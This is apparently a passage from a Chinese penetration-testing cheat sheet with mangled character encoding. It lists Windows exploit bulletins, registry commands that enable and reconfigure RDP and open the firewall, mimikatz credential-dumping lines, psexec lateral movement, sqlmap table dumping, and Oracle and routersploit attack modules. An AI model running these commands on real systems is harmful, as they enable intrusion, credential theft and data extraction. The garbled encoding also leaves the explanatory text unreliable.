MS10-065Â ã€€[KB2267960]ã€€ã€€[FastCGI]ã€€ã€€(IISÂ 5.1,Â 6.0,Â 7.0,Â andÂ 7.5)
MS10-059Â ã€€[KB982799]ã€€ã€€Â [ACL-Churraskito]ã€€ã€€(2008/7/Vista)
MS10-048Â ã€€[KB2160329]ã€€ã€€[win32k.sys]ã€€ã€€(XPÂ SP2Â &Â SP3/2003Â SP2/VistaÂ SP1Â &
SP2/2008Â GoldÂ &Â SP2Â &Â R2/Win7)
MS10-015Â ã€€[KB977165]ã€€ã€€Â [KiTrap0D]ã€€ã€€(2003/2008/7/XP)
MS10-012Â ã€€[KB971468]ã€€ã€€[SMBÂ ClientÂ Trans2Â stackÂ overflow]ã€€ã€€(Windows
7/2008R2)
MS09-050Â ã€€[KB975517]ã€€ã€€Â [RemoteÂ CodeÂ Execution]ã€€ã€€(2008/Vista)
MS09-020Â ã€€[KB970483]ã€€ã€€Â [IISÂ 6.0]ã€€ã€€(IISÂ 5.1Â andÂ 6.0)
MS09-012Â ã€€[KB959454]ã€€ã€€Â [Chimichurri]ã€€ã€€(Vista/win7/2008/Vista)
MS08-068Â ã€€[KB957097]ã€€ã€€Â [RemoteÂ CodeÂ Execution]ã€€ã€€(2000/XP)
MS08-067Â ã€€[KB958644]ã€€ã€€Â [RemoteÂ CodeÂ Execution]ã€€ã€€(WindowsÂ 2000/XP/Server
2003/Vista/ServerÂ 2008)
MS08-066Â ã€€[]ã€€ã€€Â []ã€€ã€€(WindowsÂ 2000/XP/ServerÂ 2003)
MS08-025Â ã€€[KB941693]ã€€ã€€Â [Win32.sys]ã€€ã€€(XP/2003/2008/Vista)
MS06-040Â ã€€[KB921883]ã€€ã€€Â [RemoteÂ CodeÂ Execution]ã€€ã€€(2003/xp/2000)
MS05-039Â ã€€[KB899588]ã€€ã€€Â [PnPÂ Service]ã€€ã€€(WinÂ 9X/ME/NT/2000/XP/2003)
MS03-026Â ã€€[KB823980]ã€€ã€€Â [BufferÂ OverrunÂ InÂ RPCÂ Interface]ã€€
(/NT/2000/XP/2003)
```

---

### RDP
#### cmdå¼€RDP,åŠå¤šå¼€3389
> REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber 

æµ‹è¯•å¯ä»¥ï¼š
- å¼€å¯3389ç«¯å£doså‘½ä»¤ï¼ˆå¼€å¯XP&2003ç»ˆç«¯æœåŠ¡ï¼‰
    1. æ–¹æ³•ä¸€ï¼š`REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f`
    2. æ–¹æ³•äºŒï¼š`REG add HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /d 0 /t REG_DWORD /f`
- æŸ¥çœ‹3389ç«¯å£æ˜¯å¦å¼€å¯
    `REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /*å¦‚æœæ˜¯0x0åˆ™å¼€å¯`

- æ›´æ”¹ç»ˆç«¯ç«¯å£ä¸º2008(åå…­è¿›åˆ¶ä¸ºï¼š0x7d8)
    1. `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x7d8 /f`
    2. `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 0x7D8 /f`

- æŸ¥çœ‹3389ç«¯å£æ˜¯å¦æ›´æ”¹
    `REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber/*å‡ºæ¥çš„ç»“æœæ˜¯16è¿›åˆ¶`

- å–æ¶ˆxp&2003ç³»ç»Ÿé˜²ç«å¢™å¯¹ç»ˆç«¯æœåŠ¡çš„é™åˆ¶åŠIPè¿æ¥çš„é™åˆ¶ï¼š
    `REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List /v 3389:TCP /t REG_SZ /d 3389:TCP:*:Enabled :@ xpsp2res.dll,-22009 /f`

æ­¤æ—¶å¯ä»¥é“¾æ¥3389
ç„¶åæŠ“å–å¯†ç 
```bash
D:\>mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full"" exit && dir //æ‰“å°è¾“å‡ºmimikatz
D:\>mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit >> log.txt //è¾“å‡ºåˆ°log.txt
```

#### å¤šå¼€3389
ç”¨å‘½ä»¤æ²¡æˆåŠŸï¼Œè¿˜æ˜¯ç”¨å·¥å…·æŠŠã€‚

### å¯†ç 
#### mimikatz
ææƒ
`privilege::debug`

æŠ“å–å¯†ç 
`sekurlsa::logonpasswords`

### åŸŸæ¸—é€
```bash
#å¦‚æœæ²¡æœ‰psexecå·¥å…·è®°å¾—æ‰¾pstoolå·¥å…·åŒ…ï¼Œä¼ ä¸€ä¸ªä¸Šå»
psexec \\hostIp -u [username] -p [password] cmd
```

---

## webæ¸—é€
### pos
#### å„ç±»è®ºå›/CMS/ç³»ç»Ÿ
**CMS-Hunter**

**CMS-Exploit-Framework**

##### phpmyadmin
**LOAD DATA INFILE ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´**
poc:https://github.com/Gifts/Rogue-MySql-Server

**4.8.x æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨**
[phpMyAdmin 4.8.x æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨ | Vulnspy Blog](http://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/)å¯ä»¥é€šè¿‡è¿™ä¸ªçº¿ä¸Šé¶åœºå®éªŒ,ä¸è¿‡dockeré•œåƒå¯èƒ½æœ‰ç‚¹é—®é¢˜,mysqlè¿›ç¨‹èµ·ä¸èµ·æ¥,æˆ‘çš„è§£å†³æ–¹å¼æ˜¯ç›´æ¥å¸äº†é‡è£…mysql-server,è€Œä¸”ä»–é»˜è®¤çš„aptæºæ— æ³•è®¿é—®,è¿˜è¦æ¢ä¸€ä¸‹aptæº

### sqlmap
```sql
sqlmap -u URL	åˆ¤æ–­æ³¨å…¥
sqlmap -u URL --current-db	 è·å–å½“å‰æ•°æ®åº“
sqlmap -u URL -D DATABASE --tables		è·å–æ•°æ®åº“è¡¨
sqlmap -u URL -D DATABASE -T TABLES --columns	è·å–æŒ‡å®šè¡¨çš„åˆ—å
sqlmap -u URL -D DATABASE -T TABLES -C COLUMNS --dump		è·å–æŒ‡å®šè¡¨çš„åˆ—å
```

---

## ä¸šåŠ¡æ¸—é€
### æ•°æ®åº“
#### oracle
**CVE-2012-1675 Oracle TNS Listener Remote Poisoning**
```bash
use auxiliary/admin/oracle/tnscmd   #è¯¥æ¼æ´å¯ä»¥è¿œç¨‹è·å–åˆ°oracleçš„å†…å­˜ä¿¡æ¯ï¼Œè‹¥æ˜¯èƒ½è·å–åˆ°å†…å­˜ä¸­çš„æ•°æ®å³ä¸ºå­˜åœ¨æ¼æ´ã€‚
use auxiliary/admin/oracle/sid_brute  #çˆ†ç ´oracleçš„SID
```

### openssl
MassBleed
sslscan
testssl

---

# 7å·¥æ§/ç‰©è”ç½‘/ç‰©ç†
## ç‰©è”ç½‘
### è·¯ç”±å™¨
#### routersoloit
å®‰è£…
```bash
git clone https://www.github.com/threat9/routersploit
cd routersploit
python3 -m pip install -r requirements.txt
python3 rsf.py
```

å‡ ä¸ªæ¨¡å—
```bash
use scanners/autopwn
set target
run
```

`ä½ ä»¥ä¸ºå¾ˆå¤šäº‹æ˜¯å¯ä»¥é‡å¤çš„ï¼Œè¿˜æœ‰ä¸‹ä¸€æ¬¡ï¼Œä½†ä½ é”™äº†ã€‚åŒ…æ‹¬ä½ å„¿æ—¶çš„ä¸‡èŠ±ç­’æˆ–çº¸é£æœºï¼ŒæŠ„ä½œä¸šæˆ–ä¹°ç³–æœï¼Œæ—©å°±æ˜¯æ­¤ç”Ÿçš„æœ€åä¸€æ¬¡ã€‚ï¼ˆéŸ©å°‘åŠŸ ã€Šæ—¥å¤œä¹¦ã€‹ï¼‰ `
